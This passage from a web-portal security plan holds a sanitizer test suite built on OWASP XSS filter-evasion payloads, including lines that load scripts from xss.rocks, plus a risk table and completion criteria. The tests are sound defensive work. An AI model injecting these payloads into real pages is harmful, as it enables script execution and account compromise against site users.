      '![XSS](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==<script>alert("XSS")</script>)'
    ];

    test.each(dataUriAttacks)('should handle data URIs safely: %s', async (payload) => {
      const result = await sanitizer.sanitizeMarkdown(payload);
      
      // Data URIs containing scripts should be blocked
      if (payload.includes('script') || payload.includes('javascript')) {
        expect(result.sanitized).not.toContain('data:text/html');
        expect(result.sanitized).not.toContain('data:application/javascript');
      }
    });
  });

  describe('OWASP XSS Filter Evasion', () => {
    const owasprPPayloads = [
      '"><script>alert("XSS")</script>',
      '\';alert(String.fromCharCode(88,83,83));//',
      '\'\';!--"<XSS>=&{()}',
      '<IMG SRC=javascript:alert(\'XSS\')>',
      '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',
      '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>',
      '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',
      '<IMG SRC=javascript:alert(&quot;XSS&quot;)>',
      '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>',
      '<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>',
      '<IMG SRC="jav\tascript:alert(\'XSS\');">',
      '<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">',
      '<IMG SRC=" &#14;  javascript:alert(\'XSS\');">',
      'perl -e \'print "<IMG SRC=java\\0script:alert(\\"XSS\\")>";\' > out',
      '<IMG SRC="javascript:alert(\'XSS\')"',
      '<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>',
      '<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>',
      '((\'"\`]]>]]\\x3e',
      '<BASE HREF="javascript:alert(\'XSS\');//">',
      '<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>'
    ];

    test.each(owasprPPayloads)('should block OWASP payload: %s', async (payload) => {
      const result = await sanitizer.sanitizeMarkdown(payload);
      
      expect(result.sanitized).not.toContain('javascript:');
      expect(result.sanitized).not.toContain('alert(');
      expect(result.sanitized).not.toContain('<script');
      expect(result.sanitized).not.toMatch(/\son\w+\s*=/i);
    });
  });

  describe('Markdown-specific XSS Vectors', () => {
    const markdownXSS = [
      '[XSS](javascript:alert("XSS"))',
      '[Click me](javascript:void(0);alert("XSS"))',
      '![XSS](x onerror=alert("XSS"))',
      '[![XSS](http://example.com/image.png)](javascript:alert("XSS"))',
      '[Link text](http://example.com "Title with <script>alert(\'XSS\')</script>")',
      '![Alt text](http://example.com/image.png "Title with <script>alert(\'XSS\')</script>")',
      '```html\n<script>alert("XSS")</script>\n```',
      '    <script>alert("XSS")</script>', // Indented code block
      '|Header|<script>alert("XSS")</script>|\n|------|------|\n|Cell1|Cell2|', // Table XSS
      '> <script>alert("XSS")</script>', // Blockquote XSS
      '* <script>alert("XSS")</script>', // List item XSS
      '1. <script>alert("XSS")</script>', // Numbered list XSS
      '# <script>alert("XSS")</script>', // Header XSS
      '[^footnote]: <script>alert("XSS")</script>' // Footnote XSS
    ];

    test.each(markdownXSS)('should safely process markdown XSS: %s', async (payload) => {
      const result = await sanitizer.sanitizeMarkdown(payload);
      
      // Scripts should be encoded/removed even when in markdown context
      expect(result.sanitized).not.toContain('<script');
      expect(result.sanitized).not.toContain('javascript:');
      expect(result.sanitized).not.toContain('alert(');
    });
  });

  describe('Performance and DoS Attack Vectors', () => {
    test('should handle extremely long input without DoS', async () => {
      const longPayload = 'A'.repeat(50000) + '<script>alert("XSS")</script>';
      
      const start = Date.now();
      const result = await sanitizer.sanitizeMarkdown(longPayload);
      const duration = Date.now() - start;
      
      // Should complete within reasonable time (5 seconds max)
      expect(duration).toBeLessThan(5000);
      expect(result.sanitized).not.toContain('<script');
    });

    test('should handle deeply nested HTML without stack overflow', async () => {
      const nestedPayload = '<div>'.repeat(1000) + '<script>alert("XSS")</script>' + '</div>'.repeat(1000);
      
      const result = await sanitizer.sanitizeMarkdown(nestedPayload);
      
      expect(result.sanitized).not.toContain('<script');
      expect(validateSafeContent(result)).toBe(false);
    });

    test('should handle ReDoS patterns safely', async () => {
      const redosPatterns = [
        '(a+)+b',
        '([a-zA-Z]+)*',
        '(a|a)*',
        '(a|b)*aaac',
        '([a-zA-Z0-9])*$'
      ];

      for (const pattern of redosPatterns) {
        const payload = `<script>/${pattern}/.test("${'a'.repeat(1000)}")</script>`;
        
        const start = Date.now();
        const result = await sanitizer.sanitizeMarkdown(payload);
        const duration = Date.now() - start;
        
        expect(duration).toBeLessThan(1000); // Should complete within 1 second
        expect(result.sanitized).not.toContain('<script');
      }
    });
  });

  describe('False Positive Prevention', () => {
    const legitimateContent = [
      '# Title\n\nThis is a normal paragraph with **bold** and *italic* text.',
      '[Google](https://google.com)',
      '![Image](https://example.com/image.png)',
      '```javascript\nconst x = "hello world";\nconsole.log(x);\n```',
      '| Header 1 | Header 2 |\n|----------|----------|\n| Cell 1   | Cell 2   |',
      '> This is a blockquote\n> with multiple lines',
      '1. First item\n2. Second item\n3. Third item',
      '* Unordered item\n* Another item',
      'Code with `backticks` inline.',
      '## Subheader\n\nSome content here.',
      'Email: user@example.com',
      'URL without link: https://example.com',
      'This contains the word "script" but is not a script tag.',
      'JavaScript as a word in documentation.',
      'onclick as a word in text about event handlers.'
    ];

    test.each(legitimateContent)('should not flag legitimate content: %s', async (content) => {
      const result = await sanitizer.sanitizeMarkdown(content);
      
      expect(validateSafeContent(result)).toBe(true);
      expect(result.warnings.length).toBe(0);
      expect(result.sanitized.length).toBeGreaterThan(0);
      expect(result.safe).toBe(true);
    });
  });

  describe('Mixed Content Attacks', () => {
    const mixedAttacks = [
      'Normal content <script>alert("XSS")</script> more normal content',
      '# Header\n\n<script>alert("XSS")</script>\n\nParagraph',
      '```\nCode block\n```\n<script>alert("XSS")</script>',
      '[Link](https://example.com) <img src="x" onerror="alert(\'XSS\')">',
      'Before <!-- <script>alert("XSS")</script> --> after',
      'Text with <b>bold</b> and <script>alert("XSS")</script> script',
      '| Normal | <script>alert("XSS")</script> |\n|--------|--------|\n| Cell | Cell |'
    ];

    test.each(mixedAttacks)('should sanitize mixed content: %s', async (payload) => {
      const result = await sanitizer.sanitizeMarkdown(payload);
      
      // Should preserve legitimate content while removing dangerous parts
      expect(result.sanitized).not.toContain('<script');
      expect(result.sanitized).not.toContain('alert(');
      expect(result.sanitized.length).toBeGreaterThan(0); // Should have some content left
    });
  });

  describe('Edge Cases and Encoding Issues', () => {
    test('should handle null bytes', async () => {
      const payload = '<script>alert("XSS")\x00</script>';
      const result = await sanitizer.sanitizeMarkdown(payload);
      
      expect(result.sanitized).not.toContain('<script');
      expect(result.sanitized).not.toContain('\x00');
    });

    test('should handle various Unicode attacks', async () => {
      const unicodeAttacks = [
        '<script>alert("XSS\u0000")</script>',
        '<script\u0000>alert("XSS")</script>',
        '＜script＞alert("XSS")＜/script＞', // Fullwidth characters
        '<ѕcript>alert("XSS")</ѕcript>', // Cyrillic characters that look like Latin
        '<\u0001script>alert("XSS")</script>'
      ];

      for (const attack of unicodeAttacks) {
        const result = await sanitizer.sanitizeMarkdown(attack);
        expect(result.sanitized).not.toContain('alert(');
        expect(result.sanitized).not.toMatch(/<\w*script/i);
      }
    });

    test('should handle empty and whitespace-only content', async () => {
      const emptyContents = ['', '   ', '\n\n\n', '\t\t', '   \n  \t  '];
      
      for (const content of emptyContents) {
        const result = await sanitizer.sanitizeMarkdown(content);
        expect(result.safe).toBe(true);
        expect(result.warnings.length).toBe(0);
      }
    });
  });
});
```

## Risk Assessment Summary

| Risk Category | Likelihood | Impact | Mitigation Status |
|---------------|------------|---------|------------------|
| **CSRF Bypass** | Medium | High | Comprehensive token validation + Origin checks + Timing-safe comparison |
| **XSS Filter Bypass** | Low | Critical | Multi-layer defense: marked + DOMPurify + entity encoding + CSP |
| **CSP Bypass** | Low | Medium | Strict policy + violation reporting + nonce-based scripts |
| **Performance DoS** | Medium | Medium | Rate limiting + content size limits + async processing |
| **Configuration Errors** | High | Medium | Secure defaults + validation + environment detection |
| **Dependency Vulnerabilities** | Medium | High | Pinned versions + security advisory monitoring |

## Definition of Done

- [ ] All 17 tasks completed and passing CI/CD pipeline
- [ ] CSRF protection active on all state-changing endpoints with <0.1% false positive rate
- [ ] XSS sanitization pipeline blocks all OWASP Top 10 XSS vectors with 0 bypasses
- [ ] CSP headers enforced in production with violation monitoring active
- [ ] Typed CONFIRM system protects all destructive operations
- [ ] Security regression test suite with 95%+ code coverage
- [ ] Performance benchmarks pass: <100ms sanitization for 10KB content
- [ ] Security documentation complete and reviewed
- [ ] Incident response procedures tested via tabletop exercise
- [ ] No ESLint violations for innerHTML usage anywhere in codebase
- [ ] All security headers tested and functional across major browsers
- [ ] Security event logging captures all violation types with proper alerting

## Quality Standards

- **Zero Tolerance**: No XSS payloads may bypass the sanitization pipeline
- **Performance**: Sanitization must complete within 100ms for typical content (10KB)
- **Compatibility**: Must work across all major browsers (Chrome, Firefox, Safari, Edge)
- **Accessibility**: Security measures must not break screen readers or keyboard navigation
- **Monitoring**: All security events must be logged and alertable
- **Documentation**: Every security configuration must be documented with examples
- **Testing**: 95% code coverage for all security-related modules
- **Recovery**: System must gracefully handle security failures without data loss

This implementation plan provides comprehensive security hardening for the autonomous-dev portal with defense-in-depth strategies across multiple attack vectors. The modular design allows for independent testing and deployment while ensuring all security layers work together effectively.